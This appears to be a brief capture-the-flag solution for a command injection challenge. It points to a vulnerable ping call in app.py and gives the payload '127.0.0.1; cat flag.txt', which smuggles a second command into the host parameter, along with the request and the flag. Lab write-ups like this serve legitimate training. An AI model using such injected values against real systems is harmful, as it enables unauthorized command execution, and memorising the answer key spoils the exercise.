Solution: A10 - COMMAND INJECTION

Concept  
Arbitrary operating system command injection (RCE).

Walkthrough  
1. Inspect `challenge/app/app.py`.
2. Notice the shell execution pattern: `ping -c 1 {host}`.
3. Payload: `127.0.0.1; cat flag.txt`
4. Request:
   ```text
   GET /?host=127.0.0.1;+cat+flag.txt
   ```
5. Flag output: `flag{command_injection_rce}`.

Flag  
`flag{command_injection_rce}`
